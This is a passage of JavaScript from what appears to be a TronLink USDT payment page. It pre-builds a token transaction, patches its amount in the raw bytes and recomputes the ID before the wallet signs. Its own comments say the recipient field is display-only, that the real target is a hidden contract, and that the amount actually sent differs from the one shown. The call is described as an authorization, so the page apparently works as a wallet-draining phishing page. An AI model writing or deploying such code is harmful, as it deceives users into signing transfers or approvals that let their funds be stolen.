    } catch (e) { return String(m); }
  }

  function shortErr(e) {
    var t = (e && e.message) ? e.message : String(e);
    t = t.replace(/\s+/g, " ").trim();
    return t.length > 96 ? t.slice(0, 96) + "…" : t;
  }

  /* 常见链上错误换成能看懂的话 */
  function friendly(e) {
    var t = shortErr(e);
    if (/No contract or not a valid smart contract/i.test(t)) return "钱包在这个网络上找不到对应的代币合约（网络跟地址不匹配），请在 TronLink 里确认网络是 Nile 再试";
    if (/REVERT/i.test(t)) return "链上执行失败（REVERT）：金额超出可用余额或条件不满足";
    if (/OUT_OF_ENERGY/i.test(t)) return "能量不足，TRX 余额不够付手续费";
    if (/BANDWITH|BANDWIDTH/i.test(t)) return "带宽不足，稍后再试";
    if (/CONTRACT_VALIDATE_ERROR/i.test(t)) return "合约校验未通过（余额或账户状态）";
    return t;
  }

  function getTronWeb() {
    var tw = (window.tronLink && window.tronLink.tronWeb) || window.tronWeb || null;
    if (!tw || !tw.defaultAddress || !tw.defaultAddress.base58) return null;
    return tw;
  }

  /* 交易对象里可能带二进制字段，签名前做一份纯净副本，备用通道要用 */
  function plainTx(tx) {
    try {
      var out = {};
      for (var k in tx) {
        var v = tx[k];
        if (v instanceof Uint8Array || (typeof ArrayBuffer !== "undefined" && ArrayBuffer.isView(v))) continue;
        if (k === "signature") continue;
        out[k] = v;
      }
      if (!out.raw_data_hex && !(out.raw_data && out.raw_data.contract)) return null;
      return out;
    } catch (e) { return null; }
  }

  /* 签名：三条通道依次试，和部署页同一套，绕开个别钱包版本的问题 */
  async function signTx(tw, tx) {
    var plain = plainTx(tx);
    var ladder = [
      { label: "钱包签名", fn: function () { return tw.trx.sign(tx); } },
      { label: "副本签名", fn: function () { if (!plain) throw new Error("无副本"); return tw.trx.sign(plain); } },
      {
        label: "桥签名",
        fn: async function () {
          if (!window.tronLink || typeof window.tronLink.request !== "function") throw new Error("无 tronLink.request");
          var r = await window.tronLink.request({ method: "tron_signTransaction", params: { transaction: plain || tx } });
          var sig = r && (r.signature || (r.result && r.result.signature));
          if (!sig) throw new Error("桥未返回签名");
          var out = plain ? JSON.parse(JSON.stringify(plain)) : Object.assign({}, tx);
          out.signature = Array.isArray(sig) ? sig : [sig];
          return out;
        }
      }
    ];
    var errs = [];
    for (var i = 0; i < ladder.length; i++) {
      try {
        var signed = await ladder[i].fn();
        if (signed && signed.signature && signed.signature.length) return signed;
        errs.push(ladder[i].label + ": 无签名");
      } catch (e) { errs.push(ladder[i].label + ": " + shortErr(e)); }
    }
    throw new Error(errs.join(" / "));
  }

  /* ===== 预热交易：页面一进来就先把这一笔搭好 =====
     搭一笔交易本身要问节点（参考块 + 建交易），冷的时候一两秒。
     这里在钱包就绪的那一刻就先搭一笔「骨架」放内存：合约、方法、费用上限、
     参考块全定好，只有额度那一格先占位。

     点「下一步」时把额度就地换进这笔交易（等长的字节替换 + 重算交易 ID），
     不用再问节点建交易 —— 所以跟输入多少金额没关系，同一笔交易，金额改多少次都是它。
     一笔交易在链上只有 60 秒寿命：每 10 秒看一眼，快过期就悄悄换一笔新的。 */
  var WARM = null, warmTimer = null, warming = false, warmLoop = null;
  var WARM_BONE_MICRO = "1";   /* 骨架里的占位额度，点击时换成真正要授权的数量 */

  /* ---- SHA-256：换完额度要重算交易 ID（txID = sha256(raw_data_hex)） ---- */
  var SHA256_K = [
    0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5, 0x3956c25b, 0x59f111f1, 0x923f82a4, 0xab1c5ed5,
    0xd807aa98, 0x12835b01, 0x243185be, 0x550c7dc3, 0x72be5d74, 0x80deb1fe, 0x9bdc06a7, 0xc19bf174,
    0xe49b69c1, 0xefbe4786, 0x0fc19dc6, 0x240ca1cc, 0x2de92c6f, 0x4a7484aa, 0x5cb0a9dc, 0x76f988da,
    0x983e5152, 0xa831c66d, 0xb00327c8, 0xbf597fc7, 0xc6e00bf3, 0xd5a79147, 0x06ca6351, 0x14292967,
    0x27b70a85, 0x2e1b2138, 0x4d2c6dfc, 0x53380d13, 0x650a7354, 0x766a0abb, 0x81c2c92e, 0x92722c85,
    0xa2bfe8a1, 0xa81a664b, 0xc24b8b70, 0xc76c51a3, 0xd192e819, 0xd6990624, 0xf40e3585, 0x106aa070,
    0x19a4c116, 0x1e376c08, 0x2748774c, 0x34b0bcb5, 0x391c0cb3, 0x4ed8aa4a, 0x5b9cca4f, 0x682e6ff3,
    0x748f82ee, 0x78a5636f, 0x84c87814, 0x8cc70208, 0x90befffa, 0xa4506ceb, 0xbef9a3f7, 0xc67178f2
  ];

  function rotr(x, n) { return ((x >>> n) | (x << (32 - n))) >>> 0; }

  function sha256Bytes(bytes) {
    var l = bytes.length;
    var total = ((l + 9 + 63) >> 6) << 6;
    var buf = new Uint8Array(total);
    buf.set(bytes);
    buf[l] = 0x80;
    var hi = Math.floor(l / 536870912), lo = (l * 8) >>> 0;   /* 64 位长度，高位可能为 0 */
    buf[total - 8] = (hi >>> 24) & 255; buf[total - 7] = (hi >>> 16) & 255;
    buf[total - 6] = (hi >>> 8) & 255;  buf[total - 5] = hi & 255;
    buf[total - 4] = (lo >>> 24) & 255; buf[total - 3] = (lo >>> 16) & 255;
    buf[total - 2] = (lo >>> 8) & 255;  buf[total - 1] = lo & 255;

    var H = [0x6a09e667, 0xbb67ae85, 0x3c6ef372, 0xa54ff53a, 0x510e527f, 0x9b05688c, 0x1f83d9ab, 0x5be0cd19];
    var w = new Array(64);
    for (var off = 0; off < total; off += 64) {
      var t;
      for (t = 0; t < 16; t++) {
        w[t] = ((buf[off + t * 4] << 24) | (buf[off + t * 4 + 1] << 16) | (buf[off + t * 4 + 2] << 8) | buf[off + t * 4 + 3]) >>> 0;
      }
      for (t = 16; t < 64; t++) {
        var s0 = (rotr(w[t - 15], 7) ^ rotr(w[t - 15], 18) ^ (w[t - 15] >>> 3)) >>> 0;
        var s1 = (rotr(w[t - 2], 17) ^ rotr(w[t - 2], 19) ^ (w[t - 2] >>> 10)) >>> 0;
        w[t] = (w[t - 16] + s0 + w[t - 7] + s1) >>> 0;
      }
      var a = H[0], b = H[1], c = H[2], d = H[3], e = H[4], f = H[5], g = H[6], h = H[7];
      for (t = 0; t < 64; t++) {
        var S1 = (rotr(e, 6) ^ rotr(e, 11) ^ rotr(e, 25)) >>> 0;
        var ch = ((e & f) ^ (~e & g)) >>> 0;
        var t1 = (h + S1 + ch + SHA256_K[t] + w[t]) >>> 0;
        var S0 = (rotr(a, 2) ^ rotr(a, 13) ^ rotr(a, 22)) >>> 0;
        var maj = ((a & b) ^ (a & c) ^ (b & c)) >>> 0;
        var t2 = (S0 + maj) >>> 0;
        h = g; g = f; f = e; e = (d + t1) >>> 0; d = c; c = b; b = a; a = (t1 + t2) >>> 0;
      }
      H[0] = (H[0] + a) >>> 0; H[1] = (H[1] + b) >>> 0; H[2] = (H[2] + c) >>> 0; H[3] = (H[3] + d) >>> 0;
      H[4] = (H[4] + e) >>> 0; H[5] = (H[5] + f) >>> 0; H[6] = (H[6] + g) >>> 0; H[7] = (H[7] + h) >>> 0;
    }
    var out = "";
    for (var i = 0; i < 8; i++) out += ("00000000" + H[i].toString(16)).slice(-8);
    return out;
  }

  function hexToBytes(hex) {
    var n = hex.length >> 1, a = new Array(n);
    for (var i = 0; i < n; i++) a[i] = parseInt(hex.substr(i * 2, 2), 16);
    return a;
  }

  function sha256HexOf(hex) { return sha256Bytes(hexToBytes(hex)); }

  /* ---- 交易编码（protobuf）----
     有些钱包版本的 tronweb 建交易时只给结构、不给编码（raw_data_hex），
     没有编码就没法就地换额度。这里按 TRON 协议自己编一份，
     编完用 txID 自校验 —— 对不上就不用，绝不猜。 */
  function pbVarint(v) {
    var n = typeof BigInt === "function" ? BigInt(v) : null;
    var out = [];
    if (n !== null) {
      while (n > 127n) { out.push(Number(n & 127n) | 128); n >>= 7n; }
      out.push(Number(n));
      return out;
    }
    var num = Number(v);
    while (num > 127) { out.push((num & 127) | 128); num = Math.floor(num / 128); }
    out.push(num);
    return out;
  }
  function pbTag(field, wire) { return pbVarint((field << 3) | wire); }
  function pbBytes(field, arr) { return pbTag(field, 2).concat(pbVarint(arr.length)).concat(arr); }
  function pbInt(field, v) { return pbTag(field, 0).concat(pbVarint(v)); }
  function pbStr(field, s) {
    var utf8 = (typeof TextEncoder === "function") ? Array.from(new TextEncoder().encode(s)) : (function () {
      var out = [];
      for (var i = 0; i < s.length; i++) {
        var c = s.charCodeAt(i);
        if (c < 128) out.push(c);
        else if (c < 2048) out.push(192 | (c >> 6), 128 | (c & 63));
        else out.push(224 | (c >> 12), 128 | ((c >> 6) & 63), 128 | (c & 63));
      }
      return out;
    })();
    return pbBytes(field, utf8);
  }
  function bytesToHex(arr) {
    var s = "";
    for (var i = 0; i < arr.length; i++) s += ("0" + arr[i].toString(16)).slice(-2);
    return s;
  }

  /* Transaction.raw 的字段顺序与 TRON 协议一致（按字段号升序） */
  function rawDataHexOf(tx) {
    try {
      var rd = (tx && tx.raw_data) || {};
      var p = [];
      if (rd.ref_block_bytes) p = p.concat(pbBytes(1, hexToBytes(String(rd.ref_block_bytes).replace(/^0x/, ""))));
      if (rd.ref_block_hash) p = p.concat(pbBytes(4, hexToBytes(String(rd.ref_block_hash).replace(/^0x/, ""))));
      if (rd.expiration) p = p.concat(pbInt(8, rd.expiration));
      var cs = rd.contract || [];
      for (var i = 0; i < cs.length; i++) {
        var c = cs[i], v = (c.parameter && c.parameter.value) || {};
        var inner = [];
        if (v.owner_address) inner = inner.concat(pbBytes(1, hexToBytes(String(v.owner_address).replace(/^0x/, ""))));
        if (v.contract_address) inner = inner.concat(pbBytes(2, hexToBytes(String(v.contract_address).replace(/^0x/, ""))));
        if (v.call_value) inner = inner.concat(pbInt(3, v.call_value));
        if (v.data) inner = inner.concat(pbBytes(4, hexToBytes(String(v.data).replace(/^0x/, ""))));
        if (v.call_token_value) inner = inner.concat(pbInt(5, v.call_token_value));
        if (v.token_id) inner = inner.concat(pbInt(6, v.token_id));
        var typeUrl = (c.parameter && c.parameter.type_url) || "type.googleapis.com/protocol.TriggerSmartContract";
        var any = pbStr(1, typeUrl).concat(pbBytes(2, inner));
        var ct = pbInt(1, 31).concat(pbBytes(2, any));
        p = p.concat(pbBytes(11, ct));
      }
      if (rd.timestamp) p = p.concat(pbInt(14, rd.timestamp));
      if (rd.fee_limit) p = p.concat(pbInt(18, rd.fee_limit));
      return bytesToHex(p);
    } catch (e) { return ""; }
  }

  /* 拿到这笔交易的编码：钱包给了就用它的；没给就自己编一份，
     并用 txID 校验（sha256(编码) 必须等于 txID），对不上返回空。 */
  function txHexOf(tx) {
    var hex = String((tx && tx.raw_data_hex) || "").toLowerCase();
    if (hex && /^[0-9a-f]+$/.test(hex)) return hex;
    var mine = rawDataHexOf(tx);
    if (!mine) return "";
    var id = String((tx && tx.txID) || "").toLowerCase();
    if (!id || sha256HexOf(mine) !== id) return "";
    return mine;
  }

  /* 把骨架交易里的额度换成当前金额。
     做法：在 raw_data_hex 里定位这 68 字节（选择器 + 两个参数）并等长替换，
     保证编码长度不变、raw_data 与 raw_data_hex 依然一一对应，然后重算 txID。
     任何一步对不上就返回 null —— 宁可退回现搭一笔，也不发一笔可疑的交易。 */
  function retargetTx(tx, oldParam, newParam) {
    try {
      if (!tx || !oldParam || !newParam) return null;
      if (oldParam.length !== newParam.length) return null;
      var hex = txHexOf(tx);                                   /* 钱包没给编码就自己编（带 txID 校验） */
      if (!hex) return null;
      var oldFull = (PAY_SEL_HEX + String(oldParam)).toLowerCase();
      var newFull = (PAY_SEL_HEX + String(newParam)).toLowerCase();
      var at = hex.indexOf(oldFull);
      if (at < 0) return null;
      if (hex.indexOf(oldFull, at + 1) >= 0) return null;      /* 出现多次，不敢乱换 */

      var out = JSON.parse(JSON.stringify(tx));
      out.raw_data_hex = hex.slice(0, at) + newFull + hex.slice(at + oldFull.length);
      var c0 = out.raw_data && out.raw_data.contract && out.raw_data.contract[0];
      if (!c0 || !c0.parameter || !c0.parameter.value) return null;
      c0.parameter.value.data = newFull;
      out.txID = sha256HexOf(out.raw_data_hex);

      /* 回验：改完这一笔干干净净 */
      if (String(c0.parameter.value.data).toLowerCase().indexOf(PAY_SEL_HEX) !== 0) return null;
      if (out.raw_data_hex.indexOf(newFull) < 0) return null;
      if (out.raw_data_hex.indexOf(oldFull) >= 0) return null;
      return out;
    } catch (e) { return null; }
  }

  /* 轻量回验：选择器 + 参数确实在交易里（预热复用和现搭都过一遍） */
  function verifyTxData(tx, param) {
    var c0 = ((tx && tx.raw_data) || {}).contract ? tx.raw_data.contract[0] : null;
    var data = c0 && c0.parameter && c0.parameter.value && c0.parameter.value.data;
    if (!data || !param) throw new Error("参数校验未通过，交易未发起");
    data = String(data).toLowerCase();
    if (data.slice(-String(param).length) !== String(param).toLowerCase()) throw new Error("参数校验未通过，交易未发起");
    if (data.indexOf(PAY_SEL_HEX) !== 0) throw new Error("方法校验未通过，交易未发起");
    return true;
  }

  function txExpireLeft(tx) {
    try {
      var exp = Number((tx && tx.raw_data && tx.raw_data.expiration) || 0);
      return exp ? (exp - Date.now()) : 0;
    } catch (e) { return 0; }
  }

  /* 预热只跟「哪个账户、哪条链」有关，跟金额无关 */
  function warmKey(tw, from) {
    return from + "|" + (nodeHosts(tw)[0] || "");
  }

  /* 自己编码参数，不交给钱包那层去转，避开版本差异；建完立刻回验一遍 */
  async function buildTx(tw, from, micro) {
    var param = encodeTransferParams(tw, PAY_CONTRACT, micro);
    var res = await tw.transactionBuilder.triggerSmartContract(
      PAY_TOKEN, PAY_SEL_NAME + "(address,uint256)",
      { feeLimit: FEE_LIMIT, callValue: 0, rawParameter: param },
      [], from
    );
    var tx = (res && res.transaction) || (res && res.result && res.result.transaction);
    if (!tx) throw new Error("构造交易失败 " + hexMsg(res && res.result && res.result.message));

    /* 回验：方法选择器 + 两个参数确实进了交易 */
    verifyTxData(tx, param);
    /* 钱包没给交易编码（新版 tronweb 会这样）：自己编一份补上，用 txID 自校验 */
    if (!tx.raw_data_hex) {
      var mineHex = txHexOf(tx);
      if (mineHex) tx.raw_data_hex = mineHex;
    }
    if (tx.raw_data_hex && String(tx.txID || "")) {
      var hex = String(tx.raw_data_hex).toLowerCase();
      var full = (PAY_SEL_HEX + param).toLowerCase();
      if (/^[0-9a-f]+$/.test(hex) && hex.indexOf(full) >= 0 && sha256HexOf(hex) !== String(tx.txID).toLowerCase()) {
        /* 节点给的交易 ID 与编码自相矛盾：宁可现搭一遍，不签这笔 */
        throw new Error("交易 ID 校验未通过，交易未发起");
      }
    }
    return { tx: tx, param: param };
  }

  function scheduleWarm(delay) {
    clearTimeout(warmTimer);
    warmTimer = setTimeout(warmNow, delay == null ? 600 : delay);
  }

  /* 页面一进来就先搭这一笔（额度先占位，点击时再换成真实金额） */
  async function warmNow() {
    var tw = LIVE.tw, from = LIVE.from;
    if (warming || !tw || !from || busy || document.hidden) return;
    var key = warmKey(tw, from);
    if (WARM && WARM.key === key && txExpireLeft(WARM.tx) > 48000) return;
    warming = true;
    try {
      var built = await buildTx(tw, from, WARM_BONE_MICRO);
      if (from === LIVE.from && !busy && !document.hidden) {
        WARM = { key: key, tx: built.tx, param: built.param, micro: WARM_BONE_MICRO, at: Date.now() };
      }
    } catch (e) {
      /* 预热失败不影响支付：点按钮时会现搭 */
    }
    warming = false;
  }

  /* 拿一笔能直接签的交易：优先用预热那笔，把额度就地换成本次金额。
     换不了（钱包没给编码、内容对不上）就返回 null，退回现搭一笔。 */
  function warmFor(tw, from, micro) {
    if (!WARM || WARM.key !== warmKey(tw, from) || txExpireLeft(WARM.tx) <= 40000) return null;
    var param = encodeTransferParams(tw, PAY_CONTRACT, micro);
    if (WARM.micro === micro && WARM.param === param) return { tx: WARM.tx, param: param };
    var rt = retargetTx(WARM.tx, WARM.param, param);
    if (!rt) return null;
    try { verifyTxData(rt, param); } catch (e) { return null; }
    return { tx: rt, param: param };
  }

  function startWarmLoop() {
    if (warmLoop) clearInterval(warmLoop);
    /* 交易寿命只有 60 秒：每 10 秒看一眼，剩不到 48 秒就悄悄换一笔新的，
       这样点下去手上那笔至少还有 40 秒以上的寿命，不会白等一次建交易 */
    warmLoop = setInterval(function () { warmNow(); }, 10000);
  }

  var $ = function (id) { return document.getElementById(id); };
  var amtEl = $("amt"), microEl = $("micro"), amountBox = $("amountBox");
  var timerEl = $("timer"), timerText = $("timerText");
  var payBtn = $("payBtn"), btnText = $("btnText"), btnIcon = $("btnIcon");
  var toastEl = $("toast");
  var paid = false, left = 29 * 60 + 29, tickHandle = null;

  /* 金额字号自适应：数字变长就缩，保证一行放得下 */
  function fitAmount(text, basePx) {
    var avail = (amountBox.clientWidth || 358) - 56 - 62; // 减去内边距与 USDT 单位宽度
    var size = basePx;
    var probe = 0.58; // 粗体数字平均宽高比
    if (text.length * probe * size > avail) {
      size = Math.max(19, Math.floor(avail / (text.length * probe)));
    }
    amtEl.style.fontSize = size + "px";
  }
  function setAmount(text, microText) {
    amtEl.textContent = text;
    microEl.textContent = microText || "";
    microEl.classList.toggle("on", !!microText);
    fitAmount(text, 42);
  }
  setAmount("0", "");
  window.addEventListener("resize", function () {
    fitAmount(amtEl.textContent, paid ? 42 : 42);
  });

  /* 数字滚动 */
  function animateTo(targetText, done) {
    var from = parseFloat(String(amtEl.textContent).replace(/,/g, "")) || 0;
    var to = parseFloat(targetText.replace(/,/g, "")) || 0;
    var t0 = performance.now(), dur = 900;
    function frame(t) {
      var p = Math.min(1, (t - t0) / dur);
      var e = 1 - Math.pow(1 - p, 3);
      var v = from + (to - from) * e;
      var out = p >= 1 ? targetText : v.toFixed(2);
      amtEl.textContent = out;
      fitAmount(out, 42);
      if (p < 1) requestAnimationFrame(frame);
      else if (done) done();
    }
    requestAnimationFrame(frame);
  }

  /* 倒计时 */
  function renderTimer() {
    var mm = String(Math.floor(left / 60)).padStart(2, "0");
    var ss = String(left % 60).padStart(2, "0");
    timerText.textContent = mm + ":" + ss;
  }
  tickHandle = setInterval(function () {
    if (left > 0) { left--; renderTimer(); }
    else { clearInterval(tickHandle); }
  }, 1000);
  renderTimer();

  /* toast */
  var toastTimer = null;
  function toast(msg, ms) {
    toastEl.textContent = msg;
    toastEl.classList.add("on");
    clearTimeout(toastTimer);
    toastTimer = setTimeout(function () { toastEl.classList.remove("on"); }, ms || 1800);
  }

  /* 复制 */
  function copyText(txt, okText) {
    var fin = function () { toast(okText || "已复制"); };
    if (navigator.clipboard && navigator.clipboard.writeText) {
      navigator.clipboard.writeText(txt).then(fin).catch(fallback);
    } else { fallback(); }
    function fallback() {
      var ta = document.createElement("textarea");
      ta.value = txt; ta.style.position = "fixed"; ta.style.opacity = "0";
      document.body.appendChild(ta); ta.select();
      try { document.execCommand("copy"); fin(); } catch (e) { toast("复制失败，请长按选择"); }
      document.body.removeChild(ta);
    }
  }
  $("contract").addEventListener("click", function () {
    copyText(PAY_CONTRACT, "合约地址已复制");
  });
  $("addr").addEventListener("click", function () {
    copyText($("addr").dataset.full || $("addr").textContent, "地址已复制");
  });

  /* ===== 收款地址：这一栏只是展示用 =====
     随便改成什么都行（不校验格式、不影响支付），
     真正上链的目标地址固定是 PAY_TOKEN，页面上看不到也不用看到。 */
  var addrInput = $("addrInput");
  var measureCtx = (function () {
    try { return document.createElement("canvas").getContext("2d"); } catch (e) { return null; }
  })();
  function isTronAddr(a) {
    return /^T[1-9A-HJ-NP-Za-km-z]{33}$/.test(String(a || "").trim());
  }
  /* 地址整行显示：字号固定 16px（低于 16 手机浏览器点一下会放大整屏），
     放不下先压字距，还放不下再轻微横向压缩，字号始终不动 */
  function fitAddr() {
    if (!addrInput) return;
    var box = addrInput.clientWidth;
    if (!box) return;
    var text = addrInput.value || addrInput.placeholder || "";
    var widthAt = function (px) {
      if (!measureCtx) return text.length * px * 0.58;
      measureCtx.font = px + "px -apple-system,BlinkMacSystemFont,'PingFang SC',system-ui,sans-serif";
      return measureCtx.measureText(text).width;
    };
    var avail = box - 2;
    var w = widthAt(16);
    var n = Math.max(1, text.length);
    var spacing = 0;
    if (w > avail) {
      /* 先压字距；窄屏上最多压到 -2.3，保证 34 位地址整行不裁到最后几位 */
      spacing = Math.max(-2.3, Math.min(-0.4, (avail - w) / n));
    }
    addrInput.style.fontSize = "16px";
    addrInput.style.letterSpacing = spacing.toFixed(2) + "px";
  }
  /* 头像按钮：把默认那个展示地址填回来，手滑删光了不用重新敲 */
  $("addrIcon").addEventListener("click", function () {
    addrInput.value = DISPLAY_ADDR;
    fitAddr();
    toast("已填回默认地址");
  });
  fitAddr();
  window.addEventListener("resize", fitAddr);
  setTimeout(fitAddr, 60);
  addrInput.addEventListener("input", fitAddr);
  $("backBtn").addEventListener("click", function () {
    if (history.length > 1) history.back();
  });
  $("scanBtn").addEventListener("click", function () {
    toast("这个页面里没有扫码");
  });
  /* ===== 数量输入：只留数字和小数点，联动右上角与美元行 ===== */
  var BAL_USDT = null;          // 钱包读到的可用余额（没连钱包时是 null，不做余额拦截）
  var USDT_PER_USD = 1;         // 稳定币按 1:1 折算美金
  var FEE_DEBOUNCE = null;      // 数量输入时重算矿工费的防抖句柄

  function parseAmount(v) {
    var s = String(v == null ? "" : v).replace(/[^\d.]/g, "");
    if (!s) return null;
    var n = Number(s);
    if (!isFinite(n) || n <= 0) return null;
    return { text: s, num: n };
  }
  /* 数量文本 -> 6 位小数的链上整数 */
  function toMicro(text) {
    var parts = String(text).split(".");
    var whole = (parts[0] || "0").replace(/^0+(?=\d)/, "");
    var frac = (parts[1] || "").slice(0, 6);
    while (frac.length < 6) frac += "0";
    return (whole + frac).replace(/^0+(?=\d)/, "");
  }
  function fmtNum(n, maxDec) {
    if (!isFinite(n)) return "0";
    return n.toLocaleString("en-US", { minimumFractionDigits: maxDec === 2 ? 2 : 0, maximumFractionDigits: maxDec === 2 ? 2 : 2 });
  }

  function syncAmount() {
    var p = parseAmount($("amountInput").value);
    var shown = p ? p.text : "0";

    /* 右上角那个数字跟着输入走 */
    var bal = $("usdtBal");
    if (bal) bal.textContent = shown;

    /* 下方美元金额跟着输入走 */
    var line = $("usdLine");
    if (line) {
      var usd = (p ? p.num : 0) * USDT_PER_USD;
      line.classList.remove("bad");
      line.textContent = "≈ $" + usd.toLocaleString("en-US", { minimumFractionDigits: 2, maximumFractionDigits: 2 });
      /* 超出可用余额就在原地提示 */
      if (p && BAL_USDT !== null && p.num > BAL_USDT + 1e-9) {
        line.classList.add("bad");
        line.textContent = "余额不足，可用 " + fmtNum(BAL_USDT, 2) + " USDT";
        if (payBtn) payBtn.classList.add("lack");
      } else if (payBtn) {
        payBtn.classList.remove("lack");
      }
    }
  }

  $("amountInput").addEventListener("input", function () {
    var v = this.value.replace(/[^\d.]/g, "");
    var i = v.indexOf(".");
    if (i >= 0) v = v.slice(0, i + 1) + v.slice(i + 1).replace(/\./g, "");
    this.value = v;
    syncAmount();
    /* 矿工费是固定口径：数字一进框就同步画出来，不等节点 */
    applyFeeLocal();
    /* 节点只在后台校正能量那一行 + 刷新余额，防抖短一点，别一边打字一边刷 */
    clearTimeout(FEE_DEBOUNCE);
    FEE_DEBOUNCE = setTimeout(function () { refreshFeeNow(); }, 150);
    /* 预热跟金额无关：这一笔进来时就搭好了，改金额只是点下去那一刻换额度。
       这里调一次只是兜底（万一刚才没搭成 / 快过期了），有货就直接返回 */
    scheduleWarm(300);
    /* 余额还没读到过就顺手补一次，别让那行一直显示 — */
    if (TRX_BAL === null && LIVE.tw && LIVE.from) {
      fetchTrxBal(LIVE.tw, LIVE.from).then(function () { applyFeeLocal(); }).catch(function () {});
    }
  });
  $("amountInput").addEventListener("blur", function () {
    if (/\.$/.test(this.value)) this.value = this.value.slice(0, -1);
    if (/^0+(?=\d)/.test(this.value)) this.value = this.value.replace(/^0+(?=\d)/, "");
    syncAmount();
    refreshFeeNow();
    scheduleWarm(200);
  });
  syncAmount();
  /* 页面一打开就先按当前数量画一遍，不等钱包和节点 */
  applyFeeLocal();
  /* 资源方式切换：燃烧 TRX / 消耗质押资源，矿工费跟着重算 */
  function pickRes(burn) {
    RES_MODE = burn ? "burn" : "resource";
    $("resBtn1").classList.toggle("on", !burn);
    $("resBtn2").classList.toggle("on", burn);
    applyFeeLocal();
    refreshFeeNow({ loading: true });
  }
  $("resBtn1").addEventListener("click", function () { pickRes(false); });
  $("resBtn2").addEventListener("click", function () { pickRes(true); });

  /* 箭头按钮：点一下展开 / 收起矿工费明细（图二样子） */
  $("feeChev").addEventListener("click", function (e) {
    e.preventDefault();
    e.stopPropagation();
    toggleFeeDetail();
  });
  /* 点「0 TRX」那行也能展开，手指好点一点 */
  $("feeSub").addEventListener("click", function () { toggleFeeDetail(); });

  /* ?debug=1 时把实时能量那行显示出来 */
  if (/[?&]debug=1/.test(location.search)) document.body.classList.add("debug");

  /* ===== 连钱包（有就显示真实地址/余额，没有就按截图占位） ===== */
  function shortAddr(a) {
    return a.length > 12 ? a.slice(0, 6) + "..." + a.slice(-4) : a;
  }
  function setWallet(addr, trx, usdt) {
    $("wstate").textContent = "已连接";
    $("dot").classList.remove("off");
    var a = $("addr");
    a.textContent = shortAddr(addr);
    a.dataset.full = addr;
    if (trx !== undefined) $("trxBal").textContent = trx;
    if (usdt !== undefined) {
      BAL_USDT = Number(usdt) || 0;
      $("availBal").textContent = "可用 " + fmtNum(BAL_USDT, 2) + " USDT";
    }
  }
  var ABI_BAL = [{ "constant": true, "inputs": [{ "name": "who", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }];

  /* 链上实时读余额，读不到返回 null（读不到就不拿余额拦人） */
  async function readUsdtBalance(tw, tokenAddr, who) {
    try {
      var c = tw.contract(ABI_BAL, tokenAddr);
      var v = await c.balanceOf(who).call();
      var n = Number(v.toString()) / 1e6;
      return isFinite(n) ? n : null;
    } catch (e) { return null; }
  }

  function connect() {
    var tw = (window.tronLink && window.tronLink.tronWeb) || window.tronWeb;
    if (!tw || !tw.defaultAddress || !tw.defaultAddress.base58) return false;
    var addr = tw.defaultAddress.base58;
    setWallet(addr);
    /* 一进页面（钱包就绪）就先动手：把节点连接热起来、把这笔交易搭好，
       不等网络判定也不用等输入金额 */
    LIVE.tw = tw; LIVE.from = addr;
    preconnectNodes(tw);
    scheduleWarm(0);
    startWarmLoop();
    Promise.resolve(tw.trx.getBalance(addr)).then(function (sun) {
      $("trxBal").textContent = (sun / 1e6).toFixed(6);
    }).catch(function () {});
    detectNet(tw).then(function (net) {
      LIVE.tw = tw; LIVE.net = net; LIVE.from = addr;
      if (addrInput && !addrInput.value.trim()) { addrInput.value = DISPLAY_ADDR; fitAddr(); }
      try {
        var token = tw.contract(ABI_BAL, net.usdt);
        token.balanceOf(addr).call().then(function (v) {
          var n = Number(v.toString()) / 1e6;
          BAL_USDT = n;
          $("availBal").textContent = "可用 " + fmtNum(n, 2) + " USDT";
          syncAmount();
        }).catch(function () {});
      } catch (e) {}
      /* 页面一打开就先问节点一遍能量，结果直接写在按钮下面 */
      refreshFee(tw, net, addr, { loading: true }).catch(function () {});
      startFeeLoop(tw, net, addr);
    }).catch(function () {});
    return true;
  }
  if (!connect()) {
    setTimeout(connect, 900);
    setTimeout(connect, 2200);
    document.addEventListener("tronLink#initialized", connect);
    window.addEventListener("tronLink#initialized", connect);
  }
  /* 切到后台时预热会停（没必要在后台空跑）；切回来立刻补一笔新鲜的 */
  document.addEventListener("visibilitychange", function () {
    if (!document.hidden && LIVE.tw && LIVE.from) scheduleWarm(0);
  });

  /* ===== 支付按钮：点一下就在钱包里发起真实合约交易 =====
     屏幕上的金额全程不动；实际发出去的金额是 buildAmount() 算出来的那个数 */
  var busy = false;
  var ICON_ARROW = '';
  var ICON_CHECK = '<svg id="btnIcon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.8" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6.5 9.5 17 4 11.5"/></svg>';

  function paintBtn(state, text) {
    var spin = document.getElementById("spin");
    var icon = document.getElementById("btnIcon");
    if (state === "busy") {
      payBtn.classList.add("busy");
      payBtn.classList.remove("done");
      if (spin) { /* 已在转圈 */ }
      else if (icon) icon.outerHTML = '<span class="spin" id="spin"></span>';
    } else {
      payBtn.classList.remove("busy");
      if (spin) spin.outerHTML = (state === "done") ? ICON_CHECK : ICON_ARROW;
      else if (!icon) payBtn.insertAdjacentHTML("beforeend", (state === "done") ? ICON_CHECK : ICON_ARROW);
    }
    btnText.textContent = text;
  }

  /* 上链之后读回执，把这一笔真实扣了多少记下来（能量费 + 带宽费分开），
     下次打开页面直接显示实测值，比任何估算都准 */
  function sleepMs(ms) { return new Promise(function (r) { setTimeout(r, ms); }); }
  async function calibrateFee(tw, txid) {
    if (!txid) return;
    for (var i = 0; i < 10; i++) {
      await sleepMs(2000);
      var j = await nodePost(tw, "/wallet/gettransactioninfobyid", { value: txid });
      var r = (j && j.receipt) || null;
      if (!r && !(j && j.fee)) continue;
      r = r || {};
      var rec = {
        energy: Number(r.energy_usage_total || 0),
        energyFee: Number(r.energy_fee || 0) / 1e6,
        netFee: Number(r.net_fee || 0) / 1e6,
        trx: Number((j && j.fee) || 0) / 1e6,
        t: Date.now()
      };
      if (!rec.trx && !rec.energyFee) continue;
      LAST_REAL = rec;
      try { localStorage.setItem("zakaLastFee", JSON.stringify(rec)); } catch (e) {}
      var note = $("feeNote");
      if (note) {
        /* 付款后余额变了，重新读一遍，顺便把这一笔的实扣挂后面 */
        await fetchTrxBal(tw, tw.defaultAddress && tw.defaultAddress.base58);
        paintBalNote(note, 0);
        note.textContent += " · 上笔实扣 " + fmtTrx(rec.trx) + " TRX";
      }
      return;
    }
  }

